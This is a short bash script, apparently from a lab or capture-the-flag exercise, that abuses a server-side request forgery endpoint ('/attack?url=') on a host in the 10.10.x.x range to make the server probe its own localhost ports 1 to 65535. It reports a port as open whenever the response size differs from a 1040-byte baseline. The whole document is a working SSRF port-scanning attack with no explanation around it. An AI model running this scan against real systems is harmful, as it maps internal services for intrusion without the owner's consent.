#!/bin/bash

for x in {1..65535};
    do cmd=$(curl -so /dev/null http://10.10.xx.xx:8080/attack?url=http://127.0.0.1:${x} \
        -w %{size_download});
    if [ $cmd != 1040 ]; then
        echo "Open port: $x"
    fi
done
